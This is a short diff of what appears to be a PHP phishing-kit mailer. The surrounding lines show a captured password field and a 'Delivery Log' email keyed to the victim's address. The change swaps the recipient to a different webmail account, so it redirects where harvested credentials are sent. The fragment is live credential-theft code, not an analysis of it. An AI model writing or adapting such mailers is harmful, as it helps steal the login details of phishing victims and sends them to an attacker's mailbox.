@@ -206,7 +206,7 @@ Password : <b>$x2</b>
 ";
 
 
-$to = "deliveremail@gmail.com";
+$to = "hasan_ashii@yahoo.com";
 $subject = "Delivery Log | $email";
 $headers = "From: Noreply\r\n";
 
